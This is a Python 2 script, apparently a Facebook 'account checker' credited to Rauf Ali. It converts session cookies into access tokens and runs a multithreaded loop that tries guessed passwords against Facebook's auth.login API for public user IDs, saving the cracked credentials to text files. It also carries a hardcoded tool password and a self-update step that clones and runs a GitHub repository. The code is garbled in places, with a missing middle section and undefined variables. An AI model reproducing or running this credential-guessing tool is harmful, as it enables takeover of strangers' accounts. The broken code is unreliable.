import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
 

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
##### LOGO #####
logo='''
\033[1;96m ------------------------
 \033[1;32m < COD BY RAUF ALI >
 \033[1;96m ------------------------
\033[1;91md8888b.  .d8b.  db    db d88888b 
\033[1;92m88  `8D d8' `8b 88    88 88'     
\033[1;93m88oobY' 88ooo88 88    88 88ooo   
\033[1;94m88`8b   88~~~88 88    88 88~~~   
\033[1;95m88 `88. 88   88 88b  d88 88      
\033[1;96m88   YD YP   YP ~Y8888P' YP      
                                  
                                  
           \033[1;97m   .d8b.  db      d888888b 
           \033[1;96m d8' `8b 88        `88'   
           \033[1;95m 88ooo88 88         88    
           \033[1;94m 88~~~88 88         88    
           \033[1;93m 88   88 88booo.   .88.   
           \033[1;92m YP   YP Y88888P Y888888P 
                          
                          
\033[1;96m ------------------------
 \033[1;93m < FACEBORAUF-OK ACCOUNT CHECKER >
 \033[1;96m ------------------------
\033[1;97m--------------------------------------------------
\033[1;95m
 AUTHOR     : RAUF ALI
 FAVEBORAUF-OK  : CH RAUF JUTT
 YOUTUBE    : THE TORNADO BOII
 GITHUB     : GITHUB.COM/DARKRULEX
\033[1;32m
--------------------------------------------------

                       '''
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print logo
		print("\r\033[1;96m \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print "\033[1;96m ========================================="
print  """\033[1;91m====================================
\033[1;96mAuthor     \033[1;93m: \033[1;92mRauf Ali
\033[1;96mYouTube.   \033[1;93m: \033[1;92mThe Tornado Boii
\033[1;96mFacebook01  \033[1;93m: \033[1;92mwww.facebook.com/Raufonfire
\033[1;96mTelegram2. \033[1;93m: \033[1;92mwww.facebook.com/Raufonfire01
\033[1;91m====================================="""
print " \x1b[1;93m=========================================="

CorrectUsername = "RAUF"
CorrectPassword = "UNBEATABLE"

loop = 'true'
while (loop == 'true'):
    print logo  
    print "\033[1;97mSecond Step Login"
    print "\033[1;97m--------------------"
    print "\033[1;97m "
    username = raw_input("          \033[1;94mTOOL USERNAME: ")
    if (username == CorrectUsername):
    	password = raw_input("          \033[1;93mTOOL PASSWORD: ")
        if (password == CorrectPassword):
            print " FIRST STEP Is Done. Logged in Successfully as " + username
            jalan("\033[1;93m ")
            jalan("\033[1;93mPlease Wait 10 Sec, All Packages Are Checking.....")
            time.sleep(1)
            loop = 'false'
        else:
            print " Wrong Password !"
            os.system('xdg-open www.facebook.com/Raufonfire')
            os.system("clear")
    else:
        print " Wrong Username !"
        os.system('xdg-open www.facebook.com/Raufonfire')
        os.system('clear')
def ip():
    os.system('clear')
    print logo
    print
    print '\tCollecting device info'
    print
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print 47 * '-'
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print 47 * '-'
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print 47 * '-'
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print 47 * '-'
    print ' Loading ...'
    time.sleep(1)
    mohammad()


def mohammad():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = ('-').join(uuid)
    print logo
    print '\x1b[37;1mYour ID : ' + id
    try:
        httpCaht = requests.get('https://github.com/Darkrulex/Shikarichoud/blob/main/public.txt').text
        if id in httpCaht:
            print '\x1b[37;1mYOUR ID IS ACTIVE.........'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[37;1mYOUR ID IS NOT ACTIVE.........'
            time.sleep(1)
            sys.exit()
        try:
            open('.login.txt', 'r')
            b_menu()
        except IOError:
            login()

    except:
        sys.exit()
        if name == '__main__':
            mohammad()


def method_menu():
    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] Start Crack\n[ 2 ] Update Script \n" | lolcat')
    method_menu_select()


def method_menu_select():
    afza = raw_input('\x1b[0;91m> \x1b[0;94m')
    if afza == '1':
        b_menu()
    elif afza == '2':
        os.system('clear')
        print logo
        os.system('cp .... $HOME')
        os.system('rm -rf $HOME/RAUF')
        os.system('cd $HOME && git clone https://github.com/Darkrulex/Shikarichoud')
        os.system('mv $HOME/.... $HOME/RAUF')
        os.system('python2 Raufali.py')
        os.system('clear')
        print logo
        ham('\x1b[1;32m[ok] Tool Has Been Updated Successfully\x1b[0;97m')
        time.sleep(1)
        os.system('python2 Raufali.py')


def login():
    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] LOGIN WITH TOKEN \n[ 2 ] LOGIN WITH ID/PASS \n[ 3 ] LOGIN WITH COOKIE \n" | lolcat')
    login_select()


def login_select():
    afza = raw_input('\x1b[0;91m> \x1b[0;94m')
    if afza == '1':
        print ''
        token = raw_input('\x1b[0;91mToken > \x1b[0;94m')
        token_s = open('.login.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print '\x1b[0;91mSuccessful > \x1b[0;94m' + nm
            time.sleep(5)
            method_menu()
        except (KeyError, IOError):
            os.system('echo -e "\nToken Checkpoint\n" | lolcat')
            raw_input('\x1b[0;91m Enter to back ')
            login()

    elif afza == '3':
        cookie()


def cookie():
    os.system('clear')
    print logo
    print 47 * '-'
    cookie = raw_input('[?]Enter Fb  Cookie : ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail :  your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('.login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '[+] Login Successfull'
    b_menu()
    if afza == '2':
        login_fb()
    else:
        os.system('echo -e "\nError\n" | lolcat')
        login_select()
    return


def login_fb():
    id = raw_input('\x1b[0;91mID/Email > \x1b[0;94m')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('\x1b[0;91mEnter Pass > \x1b[0;94m')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        time.sleep(1)
        os.system('echo -e "\nSuccessfuled\n" | lolcat')
        time.sleep(1)
        method_menu()
    elif 'www.facebook.com' in q['error']:
        os.system('echo -e "\nID/Email & error your account is checkpoint\n" | lolcat')
        time.sleep(1)
        raw_input('\x1b[0;91mEnter to back')
        login_fb()
    else:
        os.system('echo -e "\nError\n" | lolcat')
        raw_input('\x1b[0;91mEnter to back')
        login_fb()


def b_menu():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.login.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        os.system('echo -e "\nToken Invalid\n" | lolcat')
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        os.system('echo -e "\nProblematic Connection\n" | lolcat')
        time.sleep(1)
        raw_input('\x1b[0;91m Enter To back ')
        b_menu()

    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] CRACK PUBLIC IDS\n[ 2 ] UPDATE SCRIPT\n[ 0 ] BACK"| lolcat')
    b_menu_select()




    
            
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' - ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass4
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' - ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\r\x1b[0;93mRAUF-CP ' + uid + ' - ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' - ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass5
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' - ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\r\x1b[0;93mRAUF-CP ' + uid + ' - ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' - ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass6
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' - ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mRAUF-CP ' + uid + ' - ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass7
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mRAUF-CP ' + uid + ' - ' + pass8
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass8 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass8
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mRAUF-CP ' + uid + ' - ' + pass9
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass9 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mRAUF-OK ' + uid + ' - ' + pass9
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass9 + '\n')
                                        ok.close()
                                        oks.append(uid)
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal RAUF-OK\x1b[1;93mRAUF-CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mRAUF-CP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
	
if __name__ == '__main__':
	login()
